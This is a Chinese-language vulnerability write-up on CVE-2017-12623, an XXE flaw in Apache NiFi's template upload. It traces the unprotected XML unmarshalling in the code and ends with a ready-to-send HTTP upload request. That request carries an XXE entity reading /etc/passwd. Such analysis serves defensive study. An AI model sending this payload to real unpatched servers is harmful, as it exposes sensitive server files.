### 漏洞描述

**CVE-2017-12623: Apache NiFi XXE 问题（模板 XML 上传）**

- **严重性**: 重要
- **受影响版本**: _Apache NiFi 1.0.0 - 1.3.0_
- **描述**: 任何经过身份验证的用户（具有有效的客户端证书但无 ACL 权限）可以上传包含恶意代码的模板，并通过 XML 外部实体 (XXE) 攻击访问敏感文件。
- **缓解措施**: 在 Apache NiFi 1.4.0 版本中，已修复了正确处理 XML 外部实体的问题。建议使用 1.x 系列早期版本的用户升级到相应的新版本。
- **致谢**: 此漏洞由 Paweł Gocyla 发现，并且 Mike Cole 提供了进一步的信息。
- **发布日期**: 2017 年 10 月 2 日（2018 年 1 月 23 日更新）

### Apache NiFi 介绍

Apache NiFi 是一款易于使用、功能强大且可靠的系统，专门用于数据处理和分发。它为数据流设计，支持高度可配置的数据路由、转换及系统中介逻辑，能够从多种数据源动态拉取数据。简而言之，NiFi 旨在实现系统间自动化和受管理的信息流。其基于 Web 的图形界面允许用户通过拖放、连接和配置等操作来完成基于流程的编程，从而实现数据采集与处理等功能。

### 触发流程

根据漏洞描述中的关键词 "upload" 和 "template"，我们进行全局搜索。在查找 "template" 关键字时，发现一个 JSP 文件中的表单似乎与此漏洞相关。可以看到 `file` 的 `name` 属性设置为 `template`。为了缩小搜索范围，尝试搜索 `"template"` 字符串，最终定位到了以下代码片段：

```java
// 部分函数体
unmarshal(templateInputStream, TemplateDTO.class);
```

这里将上传的数据传递给了 `unmarshal` 函数。通过跟踪调用栈，进入 `com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallerImpl` 类中的相关方法。其中，`source` 是 `StreamSource` 类型，而 `expectedType` 设置为 `TemplateDTO.class`。因此，程序执行进入 `else` 分支，此时 `reader` 已转换为 `XMLReader` 类型，并进行了相应的设置后开始解析 (`parse`) 操作。然而，在实例化 `SAXConnector` 的过程中并未采取任何针对 XXE 的防御措施，最多只防止了因 XML 解析导致的 DOS 攻击。

确认存在 XXE 漏洞后，下一步是找到该功能的具体访问路径。结合已知信息，确定完整路径为 `/nifi-api/process-groups/{id}/templates/upload`。当 NiFi 在本地启动并绑定至 8080 端口时，利用此路径发送带有恶意负载的请求即可触发漏洞。

### 示例攻击载荷

```
POST /nifi-api/process-groups/{id}/templates/upload HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="template"; filename="evil.xml"
Content-Type: text/xml

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

上述请求成功执行后，将返回服务器上的敏感信息，例如 `/etc/passwd` 文件的内容，从而证明了 XXE 漏洞的存在。